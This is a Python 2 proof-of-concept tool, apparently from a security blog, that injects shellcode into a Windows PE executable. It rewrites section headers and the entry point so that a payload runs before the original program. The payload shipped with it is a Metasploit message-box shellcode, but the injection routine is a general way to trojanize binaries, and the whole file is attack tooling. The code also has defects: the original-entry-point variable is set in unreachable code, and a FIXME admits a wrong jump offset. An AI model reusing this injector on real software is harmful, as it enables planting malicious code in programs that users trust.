#!/usr/bin/env python2
#============================================================================================================#
#===========================================================================================================#
#======= Simply injects a shellcodie into a BMP. ====================================================#
#======= Author: marcoramilli.blogspot.com ==================================================================#
#======= Version: PoC (don't even think to use it in development env.) ======================================#



# SUPER Thanks to n0p for his SectionDoubleP implementation



#======= Disclaimer: ========================================================================================#
#THIS SOFTWARE IS PROVIDED BY THE AUTHOR "AS IS" AND ANY EXPRESS OR
#IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
#DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
#INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
#SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
#HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
#STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING
#IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
#POSSIBILITY OF SUCH DAMAGE.
#===========================================================================================================#
#===========================================================================================================#
from pefile import PE
from struct import pack
import peutils
import pefile, pydasm, sys
class SectionDoublePError(Exception):
    pass

class SectionDoubleP:
    def __init__(self, pe):
        self.pe = pe

    def __adjust_optional_header(self):
        """ Recalculates the SizeOfImage, SizeOfCode, SizeOfInitializedData and
        SizeOfUninitializedData of the optional header.
        """

        # SizeOfImage = ((VirtualAddress + VirtualSize) of the new last section)
        self.pe.OPTIONAL_HEADER.SizeOfImage = (self.pe.sections[-1].VirtualAddress +
                                               self.pe.sections[-1].Misc_VirtualSize)

        self.pe.OPTIONAL_HEADER.SizeOfCode = 0
        self.pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0

        # Recalculating the sizes by iterating over every section and checking if
        # the appropriate characteristics are set.
        for section in self.pe.sections:
            if section.Characteristics & 0x00000020:
                # Section contains code.
                self.pe.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
                if section.Characteristics & 0x00000040:
                    # Section contains initialized data.
                    self.pe.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
                    if section.Characteristics & 0x00000080:
                        # Section contains uninitialized data.
                        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    def __add_header_space(self):
        """ To make space for a new section header a buffer filled with nulls is added at the
        end of the headers. The buffer has the size of one file alignment.
        The data between the last section header and the end of the headers is copied to
        the new space (everything moved by the size of one file alignment). If any data
        directory entry points to the moved data the pointer is adjusted.
        """

        FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
        SizeOfHeaders = self.pe.OPTIONAL_HEADER.SizeOfHeaders

        data = '\x00' * FileAlignment

        # Adding the null buffer.
        self.pe.__data__ = (self.pe.__data__[:SizeOfHeaders] + data +
                            self.pe.__data__[SizeOfHeaders + len(data):])

        section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

        # Copying the data between the last section header and SizeOfHeaders to the newly allocated
        # space.
        offset_new_section = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28
        size = SizeOfHeaders - offset_new_section
        data = self.pe.get_data(offset_new_section, size)
        self.pe.set_bytes_at_offset(offset_new_section + FileAlignment, data)

        # Checking data directories if anything points to the space between the last section header
        # and the former SizeOfHeaders. If that's the case the pointer is increased by FileAlignment.
        for dir in self.pe.OPTIONAL_HEADER.DATA_DIRECTORY:
            if offset_new_section < dir.VirtualAddress and dir.VirtualAddress < SizeOfHeaders:
                dir.VirtualAddress += FileAlignment

        self.pe.OPTIONAL_HEADER.SizeOfHeaders += FileAlignment

        # The raw addresses of the sections are adjusted.
        section_raw_address = section_table_offset + 0x14
        for section in self.pe.sections:
            self.pe.set_dword_at_offset(section_raw_address, section.PointerToRawData+FileAlignment)
            section_raw_address += 0x28

        self.pe.parse_sections(section_table_offset)

    def __is_null_data(self, data):
        """ Checks if the given data contains just null bytes.
        """

        for char in data:
            if char != '\x00':
                return False
        return True

    def pop_back(self):
        """ Removes the last section of the section table.
        Deletes the section header in the section table, the data of the section in the file,
        pops the last section in the sections list of pefile and adjusts the sizes in the
        optional header.
        """

        # Checking if there are any sections to pop.
        if (    self.pe.FILE_HEADER.NumberOfSections > 0
            and self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections)):

            # Stripping the data of the section from the file.
            if self.pe.sections[-1].SizeOfRawData != 0:
                self.pe.__data__ = self.pe.__data__[:-self.pe.sections[-1].SizeOfRawData]

            # Overwriting the section header in the binary with nulls.
            # Getting the address of the section table and manually overwriting
            # the header with nulls unfortunally didn't work out.
            self.pe.sections[-1].Name = '\x00'*8
            self.pe.sections[-1].Misc_VirtualSize = 0x00000000
            self.pe.sections[-1].VirtualAddress = 0x00000000
            self.pe.sections[-1].SizeOfRawData = 0x00000000
            self.pe.sections[-1].PointerToRawData = 0x00000000
            self.pe.sections[-1].PointerToRelocations = 0x00000000
            self.pe.sections[-1].PointerToLinenumbers = 0x00000000
            self.pe.sections[-1].NumberOfRelocations = 0x0000
            self.pe.sections[-1].NumberOfLinenumbers = 0x0000
            self.pe.sections[-1].Characteristics = 0x00000000

            self.pe.sections.pop()

            self.pe.FILE_HEADER.NumberOfSections -=1

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("There's no section to pop.")

    def push_back(self, Name=".NewSec", VirtualSize=0x00000000, VirtualAddress=0x00000000,
                  RawSize=0x00000000, RawAddress=0x00000000, RelocAddress=0x00000000,
                  Linenumbers=0x00000000, RelocationsNumber=0x0000, LinenumbersNumber=0x0000,
                  Characteristics=0xE00000E0, Data=""):
        """ Adds the section, specified by the functions parameters, at the end of the section
        table.
        If the space to add an additional section header is insufficient, a buffer is inserted
        after SizeOfHeaders. Data between the last section header and the end of SizeOfHeaders
        is copied to +1 FileAlignment. Data directory entries pointing to this data are fixed.

            A call with no parameters creates the same section header as LordPE does. But for the
            binary to be executable without errors a VirtualSize > 0 has to be set.

            If a RawSize > 0 is set or Data is given the data gets aligned to the FileAlignment and
            is attached at the end of the file.
            """

        if self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections):

            FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
            SectionAlignment = self.pe.OPTIONAL_HEADER.SectionAlignment

            if len(Name) > 8:
                raise SectionDoublePError("The name is too long for a section.")

            if (    VirtualAddress < (self.pe.sections[-1].Misc_VirtualSize +
                                      self.pe.sections[-1].VirtualAddress)
                or  VirtualAddress % SectionAlignment != 0):

                if (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) != 0:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize -
                         (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)
                else:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize)

            if VirtualSize < len(Data):
                VirtualSize = len(Data)

            if (len(Data) % FileAlignment) != 0:
                # Padding the data of the section.
                Data += '\x00' * (FileAlignment - (len(Data) % FileAlignment))

            if RawSize != len(Data):
                if (    RawSize > len(Data)
                    and (RawSize % FileAlignment) == 0):
                    Data += '\x00' * (RawSize - (len(Data) % RawSize))
                else:
                    RawSize = len(Data)


            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                                    self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

            # If the new section header exceeds the SizeOfHeaders there won't be enough space
            # for an additional section header. Besides that it's checked if the 0x28 bytes
            # (size of one section header) after the last current section header are filled
            # with nulls/ are free to use.
            if (        self.pe.OPTIONAL_HEADER.SizeOfHeaders <
                section_table_offset + (self.pe.FILE_HEADER.NumberOfSections+1)*0x28
                or not  self.__is_null_data(self.pe.get_data(section_table_offset +
                                                             (self.pe.FILE_HEADER.NumberOfSections)*0x28, 0x28))):

                # Checking if more space can be added.
                if self.pe.OPTIONAL_HEADER.SizeOfHeaders < 0x1000:

                    self.__add_header_space()
                    print "Additional space to add a new section header was allocated."
                else:
                    raise SectionDoublePError("No more space can be added for the section header.")


            # The validity check of RawAddress is done after space for a new section header may
            # have been added because if space had been added the PointerToRawData of the previous
            # section would have changed.
            if (RawAddress != (self.pe.sections[-1].PointerToRawData +
                               self.pe.sections[-1].SizeOfRawData)):
                RawAddress =     \
                    (self.pe.sections[-1].PointerToRawData + self.pe.sections[-1].SizeOfRawData)


            # Appending the data of the new section to the file.
            if len(Data) > 0:
                self.pe.__data__ = self.pe.__data__[:] + Data

            section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28

            # Manually writing the data of the section header to the file.
            self.pe.set_bytes_at_offset(section_offset, Name)
            self.pe.set_dword_at_offset(section_offset+0x08, VirtualSize)
            self.pe.set_dword_at_offset(section_offset+0x0C, VirtualAddress)
            self.pe.set_dword_at_offset(section_offset+0x10, RawSize)
            self.pe.set_dword_at_offset(section_offset+0x14, RawAddress)
            self.pe.set_dword_at_offset(section_offset+0x18, RelocAddress)
            self.pe.set_dword_at_offset(section_offset+0x1C, Linenumbers)
            self.pe.set_word_at_offset(section_offset+0x20, RelocationsNumber)
            self.pe.set_word_at_offset(section_offset+0x22, LinenumbersNumber)
            self.pe.set_dword_at_offset(section_offset+0x24, Characteristics)

            self.pe.FILE_HEADER.NumberOfSections +=1

            # Parsing the section table of the file again to add the new section to the sections
            # list of pefile.
            self.pe.parse_sections(section_table_offset)

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("The NumberOfSections specified in the file header and the " +
                                      "size of the sections list of pefile don't match.")

def print_section_info(pe):
    for section in pe.sections:
        print section

    # If you don't have pydasm installed comment the rest of the function out.
    print "The instructions at the beginning of the last section:"

    ep = pe.sections[-1].VirtualAddress
    ep_ava = ep+pe.OPTIONAL_HEADER.ImageBase
    data = pe.get_memory_mapped_image()[ep:ep+6]
    offset = 0
    while offset < len(data):
        i = pydasm.get_instruction(data[offset:], pydasm.MODE_32)
        print pydasm.get_instruction_string(i, pydasm.FORMAT_INTEL, ep_ava+offset)
        offset += i.length


# windows/messagebox - 265 bytes
# http://www.metasploit.com
# ICON=NO, TITLE=W00t!, EXITFUNC=process, VERBOSE=false,
# TEXT=
sample_shell_code = ("\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64" +
                     "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e" +
                     "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60" +
                     "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b" +
                     "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01" +
                     "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d" +
                     "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01" +
                     "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01" +
                     "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89" +
                     "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45" +
                     "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff" +
                     "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64" +
                     "\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56\xff\x55" +
                     "\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8" +
                     "\x61\xff\xff\xff\x68\x21\x58\x20\x20\x68\x57\x30\x30\x74" +
                     "\x31\xdb\x88\x5c\x24\x05\x89\xe3\x68\x65\x21\x58\x20\x68" +
                     "\x20\x48\x65\x72\x68\x20\x57\x61\x73\x68\x73\x69\x73\x78" +
                     "\x78\x78\x65\x62\x61\x31\xc9\x88\x4c\x24\x12\x89\xe1\x31" +
                     "\xd2\x52\x53\x51\x52\xff\xd0")


if __name__ == '__main__':
    exe_file = raw_input('[*] Enter full path of the main executable :')
    final_pe_file = raw_input('[*] Enter full path of the output executable :')

    pe = PE(exe_file)
    if (peutils.is_probably_packed(pe)):
        print("[-] Packed binary .... nothing to be done yet")
        exit()
        OEP = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        print("[+] original entry point (OEP): " + str(OEP))

    pe_section = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    print("[+] getting section: " + str(pe_section))

    align = pe.OPTIONAL_HEADER.SectionAlignment
    what_left = (pe_section.VirtualAddress + pe_section.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint

    print("[+] Alignment: " + str(align) )
    print("[+] Space where to inject: " +str(what_left) )

    end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + what_left
    padd = align - (end_rva % align)
    e_offset = pe.get_offset_from_rva(end_rva+padd) - 1
    scode_size = len(sample_shell_code)+7 #+7 because i need to popad everything as was before !

    print("[+] End of Virtual Address: " + str(end_rva))
    print("[+] Padding: " + str(padd))
    print("[+] Offset: " + str(e_offset))
    if padd < scode_size:
        # Enough space is not available for shellcode
        #TODO: using Library to Add new Section
        print("[-] Not enough space into executable for injecting. You need to add a new section.. it's still in todo list")
        sections = SectionDoubleP(pe)
        print("[+] Adding new Section")
        try:
            jmp_to = OEP #FIXME: this is wrong.. we need the right offset !
            sample_shell_code = '\x60%s\x61\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
            sections.push_back(Characteristics=0x60000020, Data=sample_shell_code)
            print("[+] Printing all sections !")
            print_section_info(pe)
            pe.write(filename=final_pe_file)

        except SectionDoublePError as e:
            print("[-] Error: " + e)
            exit()

    print("[+] Injecting code into section !")
    # Code can be injected
    scode_end_off = e_offset
    scode_start_off = scode_end_off - scode_size
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.get_rva_from_offset(scode_start_off)
    print("[+] New Entry Point: " + str(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    raw_pe_data = pe.write()
    jmp_to = OEP - pe.get_rva_from_offset(scode_end_off)
    print("[+] Dynamic Rebase Calculation ..")
    sample_shell_code = '\x60%s\x61\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
    print("[+] ShellCode Injected:")
    print("==========================================")
    print(sample_shell_code)
    print("==========================================")
    final_data = list(raw_pe_data)
    final_data[scode_start_off:scode_start_off+len(sample_shell_code)] = sample_shell_code
    final_data = ''.join(final_data)
    raw_pe_data = final_data
    pe.close()
    new_file = open(final_pe_file, 'wb')
    new_file.write(raw_pe_data)
    new_file.close()
    print '[*] Job Done! :)'
